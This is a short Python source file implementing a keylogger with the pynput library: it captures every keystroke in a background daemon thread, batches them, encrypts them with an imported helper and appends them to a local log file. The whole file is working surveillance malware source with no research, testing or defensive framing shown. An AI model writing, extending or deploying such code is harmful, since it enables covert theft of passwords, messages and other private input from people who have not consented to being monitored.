
from pynput import keyboard
from encryption import encrypt_data

log_file = "keylog_info.txt"
key_logs = []

def on_press(key):
    try:
        key_logs.append(key.char)
    except AttributeError:
        key_logs.append(f"[{key}]")

    if len(key_logs) >= 5:  
        save_keys()

def save_keys():
    if key_logs:
        data = ''.join(key_logs)
        encrypted_data = encrypt_data(data)
        with open(log_file, "ab") as f:
            f.write(encrypted_data + b"\n")
        key_logs.clear()

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True  # allows main script to exit even if this runs forever
    listener.start()
